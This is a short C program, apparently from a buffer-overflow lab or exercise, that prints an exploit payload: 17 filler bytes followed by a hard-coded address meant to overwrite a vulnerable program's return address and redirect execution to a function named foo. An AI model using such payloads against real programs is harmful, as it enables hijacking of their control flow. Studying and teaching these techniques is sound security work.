#include <stdio.h>
#include <string.h>
int main(){
	char buf[200];
	//assume we need 17 bytes to reach return address
	strcpy(buf,"abcdeabcdeabcdeab"); // 17 bytes
	//and we overwrite return address
	//with the address of foo
	buf[17]=0x9c;
	buf[18]=0x84;
	buf[19]=0x04;
	buf[20]=0x08;
	write(1, buf, 21); 
	//write to file number 1 which is the screen
	return 0;
}
